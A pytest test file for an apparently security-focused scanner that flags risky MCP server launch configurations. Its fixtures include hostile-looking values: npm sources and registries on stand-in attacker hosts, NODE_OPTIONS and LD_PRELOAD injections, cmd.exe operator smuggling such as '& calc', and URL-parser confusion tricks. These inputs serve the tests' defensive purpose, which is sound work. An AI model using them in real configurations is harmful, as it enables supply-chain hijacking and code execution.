"""Static risk checks on configured MCP servers (shadowscan.connectors.mcp_risk)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from shadowscan.connectors.code.mcp_config import _parse_mcp_servers
from shadowscan.connectors.mcp_risk import (
    RISK_DESCRIPTIONS,
    McpRisk,
    PackageRef,
    assess_server,
    assess_transport,
    registry_package,
    server_package,
)
from shadowscan.models import Finding, Kind, Surface
from shadowscan.risk import assess


def ids(server: dict) -> list[str]:
    return [risk.id for risk in assess_server(server)]


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github"]),
        ("npx", ["-y", "@modelcontextprotocol/server-github@latest"]),
        ("npx", ["@playwright/mcp@^0.0.30"]),
        ("npx", ["--yes", "--package", "mcp-remote", "mcp-remote", "https://example.com"]),
        ("npx", ["--registry", "https://registry.npmjs.org", "some-server"]),
        ("bunx", ["some-server"]),
        ("pnpm", ["dlx", "some-server@next"]),
        ("yarn", ["dlx", "some-server"]),
        ("bun", ["x", "some-server"]),
        ("uvx", ["mcp-server-fetch"]),
        ("uvx", ["--from", "mcp-server-git>=0.6", "mcp-server-git"]),
        ("uvx", ["--python", "3.12", "mcp-server-time"]),
        ("uv", ["tool", "run", "mcp-server-sqlite"]),
        ("pipx", ["run", "mcp-server-fetch"]),
        ("pipx", ["run", "--spec", "mcp-server-git", "mcp-server-git"]),
        ("docker", ["run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/github/github-mcp-server"]),
        ("docker", ["run", "-i", "mcp/fetch:latest"]),
        ("podman", ["run", "--name", "x", "registry.local:5000/mcp/git"]),
        ("npx -y some-server", []),
    ],
)
def test_floating_package_or_image_is_unpinned(command, args):
    assert "mcp-unpinned-package" in ids({"command": command, "args": args})


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "@modelcontextprotocol/server-github@2025.4.8"]),
        ("npx", ["some-server@1.2.3-beta.1"]),
        ("npx", ["./local/server.js"]),
        ("npx", ["--package=mcp-remote@0.1.9", "mcp-remote"]),
        ("uvx", ["mcp-server-fetch==2025.4.7"]),
        ("uvx", ["mcp-server-fetch@2025.4.7"]),
        ("uvx", ["--from=git+https://github.com/org/repo", "server"]),
        ("pipx", ["run", "--spec", "mcp-server-git==0.6.2", "mcp-server-git"]),
        ("docker", ["run", "-i", "ghcr.io/github/github-mcp-server@sha256:" + "a" * 64]),
        ("docker", ["run", "-i", "mcp/fetch:1.4.2"]),
        ("python", ["-m", "internal_mcp.server"]),
        ("node", ["/opt/servers/index.js"]),
    ],
)
def test_pinned_or_local_server_is_not_unpinned(command, args):
    assert "mcp-unpinned-package" not in ids({"command": command, "args": args})


def test_launcher_without_a_package_is_not_flagged():
    assert ids({"command": "npx", "args": ["-y"]}) == []
    assert ids({"command": "uvx", "args": ["--from"]}) == []
    assert ids({"command": "docker", "args": ["run", "-i"]}) == []


@pytest.mark.parametrize("root", ["/", "~", "$HOME", "/home/dana", "/Users/dana/", "C:\\", "C:\\Users\\dana"])
def test_filesystem_server_rooted_broadly(root):
    server = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", root]}
    assert ids(server) == ["mcp-broad-filesystem"]


def test_filesystem_server_with_project_directory_is_not_broad():
    server = {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/srv/data"],
    }
    assert ids(server) == []


@pytest.mark.parametrize(
    ("command", "args"),
    [("bash", ["-c", "run"]), ("/bin/sh", ["-c", "x"]), ("cmd", ["/c", "x"]), ("pwsh", ["-Command", "x"])],
)
def test_shell_wrapper(command, args):
    assert ids({"command": command, "args": args}) == ["mcp-shell-command"]


def test_shell_without_command_flag_is_not_a_wrapper():
    assert ids({"command": "bash", "args": ["server.sh"]}) == []


@pytest.mark.parametrize(
    ("url", "flagged"),
    [
        ("http://mcp.internal.example:8080/sse", True),
        ("ws://10.0.0.5/mcp", True),
        ("https://mcp.linear.app/sse", False),
        ("http://localhost:3000/mcp", False),
        ("http://127.0.0.1:3000/mcp", False),
        ("http://[::1]:3000/mcp", False),
        ("http://api.localhost/mcp", False),
        ("http://", False),
        ("http://[bad/mcp", False),
        # WHATWG URL parsers (Node, browsers) drop tab, CR and LF, strip leading C0 controls
        # and read the host after any run of slashes and backslashes: each of these reaches
        # remote.example over plaintext, though urlsplit reads localhost or no host.
        ("http:///remote.example/mcp", True),
        ("ht\ttp://remote.example\\@localhost/mcp", True),
        ("http\n://remote.example\\@localhost/mcp", True),
        ("\x01http://remote.example\\@localhost/mcp", True),
        (" HTTP://remote.example/mcp", True),
        ("http:\\\\remote.example\\mcp", True),
        ("http:/remote.example/mcp", True),
        ("http:remote.example/mcp", True),
        ("ws:\\remote.example/mcp", True),
        ("ht\ttps://remote.example/mcp", False),
        ("\thttp://localhost:3000/mcp", False),
        # An HTTP client reads the host as remote.example; parsed configuration redacts the
        # user information that held the backslash, so neither form names a known loopback.
        ("http://remote.example\\@localhost:3000/mcp", True),
        ("http://[REDACTED]@localhost:3000/mcp", True),
        ("https://remote.example\\@localhost/mcp", False),
    ],
)
def test_plaintext_remote(url, flagged):
    assert ("mcp-insecure-transport" in ids({"url": url})) is flagged


def test_a_plaintext_remote_whose_host_cannot_be_told_names_no_host():
    assert assess_server({"url": "http://remote.example\\@localhost/mcp"}) == [
        McpRisk("mcp-insecure-transport", "remote server")
    ]


def test_remote_from_urls_list_and_detail_names_only_the_host():
    risks = assess_server({"urls": ["https://ok.example/mcp", "http://plain.example/mcp?token=x"]})
    assert risks == [McpRisk("mcp-insecure-transport", "plain.example")]
    assert risks[0].description == RISK_DESCRIPTIONS["mcp-insecure-transport"]


@pytest.mark.parametrize(
    ("value", "detail"), [(True, "all tools"), (["*"], "all tools"), (["a", "b"], "2 tool(s)")]
)
def test_auto_approve(value, detail):
    risks = assess_server({"url": "https://x.example/mcp", "auto_approve": value})
    assert risks == [McpRisk("mcp-auto-approve", detail)]


def test_empty_auto_approve_and_malformed_fields_are_ignored():
    assert ids({"url": "https://x.example", "auto_approve": []}) == []
    assert ids({"command": None, "args": "not-a-list", "urls": "nope", "url": 5}) == []


def test_each_risk_is_reported_once():
    server = {"command": "npx", "args": ["a"], "urls": ["http://a.example", "http://b.example"]}
    assert ids(server) == ["mcp-unpinned-package", "mcp-insecure-transport"]


def write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def test_code_connector_tags_risky_servers_and_skips_disabled(run_connector, tmp_path):
    write(
        tmp_path,
        ".mcp.json",
        '{"mcpServers": {"open": {"command": "npx", "args": ["-y", "some-server"]},'
        ' "off": {"command": "uvx", "args": ["other"], "disabled": true},'
        ' "plain": {"url": "http://mcp.example.net/sse"}}}',
    )
    findings, ctx = run_connector("code.filesystem", path=str(tmp_path), label="repo", use_git=False)
    assert not ctx.stats.errors
    (mcp,) = [f for f in findings if f.kind == Kind.MCP_SERVER]
    assert {"mcp-unpinned-package", "mcp-insecure-transport"} <= set(mcp.tags)
    servers = {s["name"]: s for s in mcp.metadata["servers"]}
    assert servers["open"]["risks"] == ["mcp-unpinned-package"]
    assert servers["off"]["risks"] == []
    assert servers["plain"]["risks"] == ["mcp-insecure-transport"]
    risk_evidence = [e for e in mcp.evidence if e.signal.startswith("mcp-risk:")]
    assert risk_evidence and all(e.weight == 0.0 for e in risk_evidence)
    assert any(f.id == "tag:mcp-unpinned-package" for f in assess(mcp).factors)


@pytest.mark.parametrize(
    "url",
    [
        "ws://mcp.example.com/ws",
        "HTTP://mcp.example.com/mcp",
        "http://mcp.example.com/mcp",
        # URL parsers drop tabs and newlines and leading control characters; so must the factor.
        "ht\ttp://mcp.example.com/mcp",
        "http:\n//mcp.example.com/mcp",
        "\x01http://mcp.example.com/mcp",
        # WHATWG parsers read the host after one slash or backslashes as well.
        "http:/mcp.example.com/mcp",
        "http:\\\\mcp.example.com\\mcp",
    ],
)
def test_every_insecure_transport_label_is_scored(url):
    from shadowscan.connectors.mcp_risk import record_server_risks
    from shadowscan.models import Finding, Surface

    server = {"name": "remote", "transport": "http", "url": url}
    f = Finding(
        surface=Surface.CODE,
        connector="code.filesystem",
        kind=Kind.MCP_SERVER,
        title="MCP server",
        resource="repo:x",
        resource_type="mcp-config",
        metadata={"servers": [server]},
    )
    record_server_risks(f, server, ".mcp.json")
    assert "mcp-insecure-transport" in f.tags
    assert "mcp-plain-http" in {factor.id for factor in assess(f).factors}


# ------------------------------------------------------------------ package identity


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        (
            "npx",
            ["-y", "@modelcontextprotocol/server-github@1.2.3"],
            ("npm", "@modelcontextprotocol/server-github", "1.2.3"),
        ),
        ("npx", ["-y", "@Scope/Pkg@latest"], ("npm", "@scope/pkg", None)),
        ("npx", ["@playwright/mcp@^0.0.30"], ("npm", "@playwright/mcp", None)),
        ("npx", ["--yes", "--package", "mcp-remote@0.1.0", "mcp-remote"], ("npm", "mcp-remote", "0.1.0")),
        ("pnpm", ["dlx", "some-server@v2.0.0"], ("npm", "some-server", "2.0.0")),
        ("bun", ["x", "some-server"], ("npm", "some-server", None)),
        ("npx -y foo@1.0.0", [], ("npm", "foo", "1.0.0")),
        ("uvx", ["mcp-server-fetch"], ("pypi", "mcp-server-fetch", None)),
        (
            "uvx",
            ["--from", "MCP_Server.Time==0.6.2", "mcp-server-time"],
            ("pypi", "mcp-server-time", "0.6.2"),
        ),
        ("uvx", ["mcp-server-time[extra]===1.0"], ("pypi", "mcp-server-time", "1.0")),
        ("uv", ["tool", "run", "mcp-server-sqlite@v0.6"], ("pypi", "mcp-server-sqlite", "0.6")),
        (
            "pipx",
            ["run", "--spec", "mcp-server-fetch>=0.6", "mcp-server-fetch"],
            ("pypi", "mcp-server-fetch", None),
        ),
        (
            "docker",
            ["run", "-i", "--rm", "ghcr.io/github/github-mcp-server:2.0.2"],
            ("oci", "ghcr.io/github/github-mcp-server", "2.0.2"),
        ),
        ("docker", ["run", "mcp/fetch:latest"], ("oci", "docker.io/mcp/fetch", None)),
        (
            "docker",
            ["run", "index.docker.io/library/ubuntu@sha256:" + "a" * 64],
            ("oci", "docker.io/library/ubuntu", None),
        ),
        (
            "podman",
            ["run", "--name", "x", "Registry.Local:5000/mcp/time:1.0"],
            ("oci", "registry.local:5000/mcp/time", "1.0"),
        ),
        ("docker", ["run", "alpine"], ("oci", "docker.io/library/alpine", None)),
        # Windows launcher forms, and launchers named by an absolute path.
        ("npx.cmd", ["-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "pkg"], ("npm", "pkg", None)),
        ("/usr/local/bin/npx", ["-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("C:/Users/dana/.local/bin/uvx.exe", ["pkg==1.0"], ("pypi", "pkg", "1.0")),
        ("uvx.exe", ["pkg==1.0"], ("pypi", "pkg", "1.0")),
        ("cmd", ["/c", "npx", "-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("cmd.exe", ["/d", "/s", "/C", "npx -y pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        # Options that change neither the package nor where it comes from.
        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
        ("npx", ["--loglevel=silent", "-y", "@scope/pkg@1.0.0"], ("npm", "@scope/pkg", "1.0.0")),
        ("npx", ["-p", "@scope/tool@1.0.0", "tool", "--port", "1"], ("npm", "@scope/tool", "1.0.0")),
        ("npx", ["-y", "pkg@>=1.0.0 <2"], ("npm", "pkg", None)),
        ("uvx", ["--python", "3.12", "pkg"], ("pypi", "pkg", None)),
        ("uvx", ["--python=cpython@3.12", "-q", "pkg"], ("pypi", "pkg", None)),
        ("pipx", ["run", "--no-cache", "--spec=pkg==2.0", "pkg"], ("pypi", "pkg", "2.0")),
        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], ("oci", "ghcr.io/acme/tool", "1.0")),
        (
            "docker",
            [
                "run",
                "-it",
                "--gpus=all",
                "-eNAME=x",
                "--shm-size",
                "1g",
                "-a",
                "stdin",
                "ghcr.io/acme/tool:1.0",
            ],
            ("oci", "ghcr.io/acme/tool", "1.0"),
        ),
        (
            "podman",
            ["run", "--sig-proxy=false", "--tls-verify", "quay.io/acme/tool:2"],
            ("oci", "quay.io/acme/tool", "2"),
        ),
    ],
)
def test_server_package_names_the_launched_registry_package(command, args, expected):
    assert server_package({"command": command, "args": args}) == PackageRef(*expected)


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["owner/repo"]),
        ("npx", ["github:owner/repo"]),
        ("npx", ["./local-server"]),
        ("npx", ["npm:alias@1.0.0"]),
        ("npx", ["@scope"]),
        ("npx", ["-y"]),
        ("uvx", ["--from", "https://example.com/server.whl", "server"]),
        ("uvx", ["!!!"]),
        ("docker", ["run", "-i"]),
        ("docker", ["run", "https://example.com/image"]),
        ("docker", ["run", "registry.example.com/"]),
        ("sh", ["-c", "npx -y @acme/server@1.0.0"]),
        ("node", ["server.js"]),
        ("", []),
        (None, []),
        # 'name@' followed by an alias, a Git, GitHub, URL or file source fetches something else.
        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"]),
        ("npx", ["-y", "files@npm:evil-pkg"]),
        ("npx", ["-y", "@acme/files@github:attacker/evil"]),
        ("npx", ["-y", "@acme/files@https://evil.example/e.tgz"]),
        ("npx", ["-y", "@acme/files@git+https://github.com/attacker/evil.git"]),
        ("npx", ["-y", "@acme/files@file:../evil"]),
        ("npx", ["-y", "@acme/files@attacker/evil#main"]),
        # Another registry, configuration, extra package, command or unknown option.
        ("npx", ["-y", "--registry", "https://npm.attacker.example", "@acme/files@1.2.0"]),
        ("npx", ["-y", "--registry=https://npm.attacker.example", "@acme/files@1.2.0"]),
        ("npx", ["--userconfig", "./npmrc", "pkg"]),
        ("npx", ["--@acme:registry=https://npm.attacker.example", "@acme/files"]),
        ("npx", ["-c", "evil", "-p", "pkg"]),
        ("npx", ["-y", "-p", "evil-pkg", "-p", "pkg@1.0.0", "pkg"]),
        ("npx", ["-y", "-p", "pkg@1.0.0", "node", "./evil.js"]),
        ("npx", ["-y", "-p", "pkg@1.0.0"]),
        ("pnpm", ["dlx", "--shell-mode", "pkg"]),
        ("uvx", ["--index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--default-index", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--extra-index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
        ("uvx", ["--with", "evil-pkg", "pkg==1.0"]),
        ("uvx", ["--python", "./evil/python", "pkg"]),
        ("uvx", ["--python=..\\python.exe", "pkg"]),
        ("uv", ["tool", "run", "--config-file", "./uv.toml", "pkg"]),
        ("pipx", ["run", "--pip-args=--index-url=https://x.example", "pkg"]),
        ("pipx", ["run", "--index-url", "https://x.example", "pkg"]),
        ("docker", ["run", "--entrypoint", "sh", "ghcr.io/acme/tool:1.0", "-c", "evil"]),
        ("docker", ["run", "--entrypoint=sh", "ghcr.io/acme/tool:1.0"]),
        ("docker", ["run", "--not-a-docker-option", "value", "ghcr.io/acme/tool:1.0"]),
        ("docker", ["run", "-ie", "X=1", "ghcr.io/acme/tool:1.0"]),
        ("cmd", ["/c", "npx -y pkg@1.0.0 & evil"]),
        ("cmd", ["/c", "npx", "-y", "pkg", "|", "evil"]),
        ("cmd", ["/c"]),
        ("cmd", ["/c", "cmd", "/c", "npx", "pkg"]),
        ("cmd", ["/k", "bash", "-c", "npx pkg"]),
    ],
)
def test_server_package_is_none_without_a_registry_package(command, args):
    assert server_package({"command": command, "args": args}) is None


@pytest.mark.parametrize(
    "name",
    ["npm_config_registry", "NPM_CONFIG_USERCONFIG", "UV_INDEX_URL", "UV_DEFAULT_INDEX", "UV_EXTRA_INDEX_URL",
     "UV_TOOL_DIR", "PIP_INDEX_URL", "PIPX_HOME", "DOCKER_HOST", "CONTAINER_HOST"],
)  # fmt: skip
def test_server_package_is_none_when_the_environment_can_change_the_source(name):
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": ["GITHUB_TOKEN", name]}
    assert server_package(server) is None
    assert server_package({**server, "env_names": ["GITHUB_TOKEN", "NODE_ENV"]}) == PackageRef(
        "npm", "pkg", "1.0.0"
    )


def test_server_package_ignores_a_remote_only_server():
    assert server_package({"url": "https://mcp.example.com/mcp", "args": "not a list"}) is None


@pytest.mark.parametrize(
    ("command", "args"),
    [
        # A relative path runs a file of the working directory, usually the scanned repository.
        ("./npx", ["-y", "pkg@1.0.0"]),
        ("tools/uvx", ["pkg==1.0"]),
        ("node_modules/.bin/npx", ["-y", "pkg@1.0.0"]),
        (".\\npx.cmd", ["-y", "pkg@1.0.0"]),
        ("bin\\uvx.exe", ["pkg==1.0"]),
        ("~/bin/npx", ["-y", "pkg@1.0.0"]),
        # A UNC path names a file on another host.
        ("\\\\files.example\\tools\\npx.cmd", ["-y", "pkg@1.0.0"]),
        ("//files.example/tools/npx", ["-y", "pkg@1.0.0"]),
        # The same inside cmd /c, and a repository script named cmd.
        ("cmd", ["/c", ".\\npx", "-y", "pkg@1.0.0"]),
        ("cmd", ["/c", "tools/npx.cmd -y pkg@1.0.0"]),
        ("./cmd", ["/c", "npx", "-y", "pkg@1.0.0"]),
        ("./npx -y pkg@1.0.0", []),
        # /proc and /dev paths look absolute but resolve in the started process: its working
        # directory (/proc/self/cwd) or an open file (/dev/fd/N).
        ("/proc/self/cwd/npx", ["-y", "pkg@1.0.0"]),
        ("/proc/thread-self/cwd/npx", ["-y", "pkg@1.0.0"]),
        ("/proc/self/cwd/node_modules/.bin/npx", ["-y", "pkg@1.0.0"]),
        ("/proc/1234/root/usr/bin/npx", ["-y", "pkg@1.0.0"]),
        ("/./proc/self/cwd/npx", ["-y", "pkg@1.0.0"]),
        ("/usr/../proc/self/cwd/npx", ["-y", "pkg@1.0.0"]),
        ("/dev/fd/3", ["-y", "pkg@1.0.0"]),
        ("cmd", ["/c", "/proc/self/cwd/npx", "-y", "pkg@1.0.0"]),
    ],
)
def test_server_package_is_none_for_a_launcher_run_from_a_relative_path(command, args):
    assert server_package({"command": command, "args": args}) is None


@pytest.mark.parametrize(
    "name",
    ["PATH", "Path", "PATHEXT", "NODE_OPTIONS", "NODE_PATH", "NODE_EXTRA_CA_CERTS", "BUN_CONFIG_REGISTRY",
     "YARN_NPM_REGISTRY_SERVER", "PNPM_HOME", "COREPACK_NPM_REGISTRY", "UV_OVERRIDE", "UV_PYTHON",
     "UV_CONSTRAINT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONWARNINGS", "PYTHONHOME", "LD_PRELOAD",
     "DYLD_INSERT_LIBRARIES", "CONTAINERS_REGISTRIES_CONF", "CONTAINER_CONNECTION", "REGISTRY_AUTH_FILE",
     "PODMAN_CONNECTIONS_CONF", "DOCKER_CONTEXT", "DOCKER_CERT_PATH", "HOME", "USERPROFILE", "HOMEPATH",
     "APPDATA", "LOCALAPPDATA", "PROGRAMDATA", "XDG_CONFIG_HOME", "TMPDIR", "TEMP", "COMSPEC", "SHELL",
     "BASH_ENV", "ENV", "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE",
     # npm reads its global npmrc (and so its registry) under PREFIX, or DESTDIR + its prefix.
     "PREFIX", "prefix", "DESTDIR"],
)  # fmt: skip
def test_server_package_is_none_when_the_environment_changes_how_a_launcher_starts(name):
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": ["GITHUB_TOKEN", name]}
    assert server_package(server) is None


def test_server_package_keeps_its_identity_beside_environment_that_changes_neither_package_nor_program():
    names = ["GITHUB_TOKEN", "OPENAI_API_KEY", "NODE_ENV", "PYTHONUNBUFFERED", "PYTHONIOENCODING",
             "PYTHONDONTWRITEBYTECODE", "PYTHONUTF8", "HOME_ASSISTANT_URL", "PATH_TO_DB", "LOG_LEVEL",
             "INSTALL_PREFIX",
             "AWS_CA_BUNDLE"]  # fmt: skip
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": names}
    assert server_package(server) == PackageRef("npm", "pkg", "1.0.0")


def test_server_package_is_none_with_a_working_directory_or_environment_file():
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"]}
    assert server_package(server) == PackageRef("npm", "pkg", "1.0.0")
    for keys in (["cwd"], ["envFile"], ["env_file", "workingDirectory"]):
        assert server_package({**server, "launch_context": keys}) is None


@pytest.mark.parametrize(
    "options",
    [
        # Files or another working directory put over what the image runs.
        ["-v", "./evil.js:/app/index.js"],
        ["--volume=./evil.js:/app/index.js"],
        ["-v./evil.js:/app/index.js"],
        ["--mount", "type=bind,src=./evil,dst=/app"],
        ["--volumes-from", "other"],
        ["-w", "/tmp"],
        ["--workdir=/tmp"],
        # Environment that changes how the image's program starts.
        ["--env-file", "./.env"],
        ["-e", "NODE_OPTIONS=--require /x/evil.js"],
        ["-e", "NODE_OPTIONS"],
        ["--env", "PYTHONPATH=/x"],
        ["--env=LD_PRELOAD=/x/evil.so"],
        ["-eLD_PRELOAD=/x/evil.so"],
        ["-e=NODE_OPTIONS=--require /x/evil.js"],
        ["-e", "PATH=/x:/usr/bin"],
    ],
)
def test_server_package_is_none_when_docker_run_changes_what_the_image_runs(options):
    image = "ghcr.io/acme/tool:1.0"
    assert server_package({"command": "docker", "args": ["run", "-i", image]}) == PackageRef(
        "oci", "ghcr.io/acme/tool", "1.0"
    )
    assert server_package({"command": "docker", "args": ["run", "-i", *options, image]}) is None
    assert server_package({"command": "podman", "args": ["run", *options, "--rm", image]}) is None


def test_server_package_keeps_an_image_identity_beside_plain_container_environment():
    args = ["run", "-i", "--rm", "-e", "GITHUB_TOKEN", "--env=NODE_ENV=production", "-eLOG_LEVEL=debug"]
    assert server_package({"command": "docker", "args": [*args, "ghcr.io/acme/tool:1.0"]}) == PackageRef(
        "oci", "ghcr.io/acme/tool", "1.0"
    )


@pytest.mark.parametrize(
    ("command", "args"),
    [
        # cmd.exe expands %VAR% (and !VAR! with delayed expansion) before it reads operators,
        # so a variable from the server's environment can hold "& evil".
        ("cmd", ["/c", "npx", "-y", "pkg@1.0.0", "%X%"]),
        ("cmd.exe", ["/d", "/s", "/c", "npx -y pkg@1.0.0 %X%"]),
        ("cmd", ["/c", "npx", "-y", "pkg@1.0.0", "!X!"]),
        # A batch file runs through cmd.exe too.
        ("npx.cmd", ["-y", "pkg@1.0.0", "%X%"]),
        ("C:\\Program Files\\nodejs\\npx.cmd", ["-y", "pkg@1.0.0", "&", "evil"]),
        ("uvx.bat", ["pkg==1.0", "|", "evil"]),
    ],
)
def test_server_package_is_none_when_cmd_exe_reads_an_operator_or_variable(command, args):
    assert server_package({"command": command, "args": args}) is None


@pytest.mark.parametrize(
    ("kind", "identifier", "version", "expected"),
    [
        ("npm", "@Acme/MCP-Files", "1.0.0", ("npm", "@acme/mcp-files", "1.0.0")),
        ("pypi", "Acme_Legacy.MCP", "0.9.0", ("pypi", "acme-legacy-mcp", "0.9.0")),
        (
            "OCI",
            "ghcr.io/github/github-mcp-server:2.0.2",
            None,
            ("oci", "ghcr.io/github/github-mcp-server", "2.0.2"),
        ),
        ("oci", "docker.io/mcp/fetch:v1", "1.0", ("oci", "docker.io/mcp/fetch", "1.0")),
        (
            "mcpb",
            "https://example.com/Tool.mcpb",
            "3.0.0",
            ("mcpb", "https://example.com/tool.mcpb", "3.0.0"),
        ),
    ],
)
def test_registry_package_normalizes_like_a_launch(kind, identifier, version, expected):
    assert registry_package(kind, identifier, version) == PackageRef(*expected)


@pytest.mark.parametrize(
    ("kind", "identifier"), [("", "x"), ("npm", " "), ("npm", "owner/repo"), ("pypi", "-x"), ("oci", "-x")]
)
def test_registry_package_rejects_what_names_no_package(kind, identifier):
    assert registry_package(kind, identifier) is None


@pytest.mark.parametrize(
    ("kind", "identifier", "base", "expected"),
    [
        ("npm", "pkg", "https://registry.npmjs.org", ("npm", "pkg", None)),
        ("npm", "pkg", "HTTPS://registry.npmjs.org/", ("npm", "pkg", None)),
        ("pypi", "Pkg", "https://pypi.org", ("pypi", "pkg", None)),
        ("pypi", "pkg", "https://pypi.org/simple/", ("pypi", "pkg", None)),
        ("oci", "ghcr.io/acme/tool:1.0", "https://ghcr.io", ("oci", "ghcr.io/acme/tool", "1.0")),
        ("oci", "acme/tool", "https://docker.io", ("oci", "docker.io/acme/tool", None)),
        ("oci", "acme/tool", "https://index.docker.io/", ("oci", "docker.io/acme/tool", None)),
        ("nuget", "Acme.Tool", "https://api.nuget.org", ("nuget", "acme.tool", None)),
        ("npm", "pkg", "https://npm.acme.internal", None),
        ("pypi", "pkg", "https://pypi.acme.internal/simple", None),
        ("oci", "acme/tool", "https://ghcr.io", None),
        ("oci", "ghcr.io/acme/tool", "https://registry.acme.internal", None),
    ],
)
def test_registry_package_matches_only_the_public_registry_a_launch_fetches_from(
    kind, identifier, base, expected
):
    expected_ref = PackageRef(*expected) if expected is not None else None
    assert registry_package(kind, identifier, None, base) == expected_ref


@pytest.mark.parametrize(
    ("command", "args", "risks"),
    [
        # Windows launcher names are recognized by the risk checks too.
        ("npx.cmd", ["-y", "pkg"], ["mcp-unpinned-package"]),
        ("cmd.exe", ["/c", "npx", "pkg"], ["mcp-shell-command"]),
        # An alias is as pinned as the package it names; a URL with '@' in its path is not a version.
        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"], []),
        ("npx", ["-y", "@acme/files@npm:evil-pkg"], ["mcp-unpinned-package"]),
        ("npx", ["-y", "@acme/files@https://evil.example/p@1.0.0"], ["mcp-unpinned-package"]),
        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], []),
        # --gpus takes a value: the image is the next argument.
        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], []),
    ],
)
def test_launcher_forms_are_assessed_like_the_plain_launch(command, args, risks):
    assert [risk.id for risk in assess_server({"command": command, "args": args})] == risks


@pytest.mark.parametrize(
    "server",
    [
        # A redacted env name may be NODE_OPTIONS or PATH.
        {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": ["[REDACTED]", "Z"]},
        # cmd.exe reads operators and %VAR% in an argument that redaction may have hidden.
        {"command": "cmd", "args": ["/c", "npx", "-y", "pkg@1.0.0", "[REDACTED]"]},
        {"command": "npx.cmd", "args": ["-y", "pkg@1.0.0", "[REDACTED]"]},
        # A redacted docker -e may set NODE_OPTIONS in the container.
        {"command": "docker", "args": ["run", "-i", "-e", "[REDACTED]", "ghcr.io/acme/tool:1.0"]},
        # The parser marks a launch it saw change after redaction or truncation.
        {"command": "npx", "args": ["-y", "pkg@1.0.0"], "launch_unidentified": True},
    ],
)
def test_server_package_is_none_when_redaction_hides_part_of_the_launch(server):
    assert server_package(server) is None


def test_server_package_keeps_its_identity_beside_a_redacted_server_argument():
    server = {"command": "npx", "args": ["-y", "pkg@1.0.0", "--token", "[REDACTED]"], "env_names": ["TOKEN"]}
    assert server_package(server) == PackageRef("npm", "pkg", "1.0.0")


_PKG = ["-y", "pkg@1.0.0"]


@pytest.mark.parametrize(
    "server",
    [
        # Each env value of the document is redacted wherever it appears, so a value equal to
        # (or, under eight characters, inside) an env name, an argument or a docker -e hides it.
        {"command": "npx", "args": _PKG, "env": {"NODE_OPTIONS": "--require ./evil.js", "Z": "O"}},
        {"command": "npx", "args": _PKG, "env": {"NODE_OPTIONS": "--require ./e.js", "Z": "NODE_OPTIONS"}},
        {"command": "npx", "args": _PKG, "env": {"PATH": "./bin:/usr/bin", "Z": "PATH"}},
        {"command": "cmd", "args": ["/c", "npx", *_PKG, "%X%"], "env": {"X": "& calc", "Z": "%X%"}},
        {"command": "cmd", "args": ["/c", "npx", *_PKG, "&", "calc"], "env": {"Z": "&"}},
        {
            "command": "docker",
            "args": ["run", "-i", "-e", "NODE_OPTIONS=--require /x/evil.js", "acme/tool:1.0"],
            "env": {"Z": "NODE_OPTIONS=--require /x/evil.js"},
        },
        # Only the first twelve arguments are kept; cmd.exe still reads the rest.
        {"command": "cmd", "args": ["/c", "npx", *_PKG, *[f"a{i}" for i in range(8)], "&", "calc"]},
        {"command": "npx.cmd", "args": [*_PKG, *[f"a{i}" for i in range(10)], "%X%"], "env": {"X": "& calc"}},
    ],
)
def test_a_parsed_launch_redaction_or_truncation_changed_names_no_package(server):
    records = _parse_mcp_servers(".mcp.json", json.dumps({"mcpServers": {"x": server}}), [])
    assert len(records) == 1 and server_package(records[0]) is None


def test_a_parsed_launch_keeps_its_identity_when_only_server_arguments_are_hidden():
    server = {
        "command": "npx",
        "args": [*_PKG, *[f"--opt{i}" for i in range(14)]],
        "env": {"TOKEN": "x" * 24},
    }
    records = _parse_mcp_servers(".mcp.json", json.dumps({"mcpServers": {"x": server}}), [])
    assert server_package(records[0]) == PackageRef("npm", "pkg", "1.0.0")
    assert "launch_unidentified" not in records[0]


@pytest.mark.parametrize("value", ["mcp.plain.example", "http", "8080"])
def test_a_plaintext_url_another_servers_env_value_redacts_is_still_insecure(value):
    document = {
        "mcpServers": {
            "remote": {"type": "http", "url": "http://mcp.plain.example:8080/mcp"},
            "other": {"command": "node", "args": ["server.js"], "env": {"A": value}},
        }
    }
    records = _parse_mcp_servers(".mcp.json", json.dumps(document), [])
    remote = next(record for record in records if record["name"] == "remote")
    assert remote["url"] != "http://mcp.plain.example:8080/mcp" and assess_transport(remote) is None
    assert remote.get("plaintext_transport") is True
    assert assess_server(remote) == [McpRisk("mcp-insecure-transport", "remote server")]
    finding = Finding(
        surface=Surface.CODE,
        connector="code.filesystem",
        kind=Kind.MCP_SERVER,
        title="MCP server",
        resource="repo:x",
